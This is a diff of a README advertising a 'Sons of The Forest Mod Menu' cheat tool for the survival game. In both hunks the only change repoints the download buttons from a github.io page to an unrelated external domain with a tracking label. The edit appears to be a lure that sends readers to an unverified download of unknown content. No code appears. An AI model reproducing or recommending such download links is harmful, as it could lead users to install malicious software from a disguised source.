@@ -2,7 +2,7 @@
 
 The **Sons of The Forest Mod Menu** is the ultimate tool for players who want to fully customize their experience in this terrifying survival game. Whether you're exploring the vast open world, fighting off mutants, or crafting the perfect base, this mod menu gives you complete control over every aspect of the game. Unlock powerful features, bypass survival mechanics, and explore the world in ways you never thought possible. 
 
-[![Download SOFTF ModMenu](https://img.shields.io/badge/Download-SOFTF%20ModMenu-blueviolet)](https://sons-of-the-forest-mod-menu.github.io/.github/)
+[![Download SOFTF ModMenu](https://img.shields.io/badge/Download-SOFTF%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 With the **Sons of The Forest Mod Menu**, you can access unlimited resources, create custom items, modify the environment, and tweak gameplay to suit your needs. It’s the perfect way to enhance your experience, whether you want to focus on exploration, building, or simply surviving.
 
@@ -76,4 +76,4 @@ With the **Sons of The Forest Mod Menu**, you can access unlimited resources, cr
 
 The **Sons of The Forest Mod Menu** allows you to fully immerse yourself in the terrifying world of *Sons of The Forest*, removing limits and enabling endless possibilities. Whether you want to build, fight, or simply explore, this mod offers all the tools you need to survive and thrive in a brutal, open-world environment. 🌲🛠️
 
-[![Download SOFTF ModMenu](https://img.shields.io/badge/Download-SOFTF%20ModMenu-blueviolet)](https://sons-of-the-forest-mod-menu.github.io/.github/)
+[![Download SOFTF ModMenu](https://img.shields.io/badge/Download-SOFTF%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
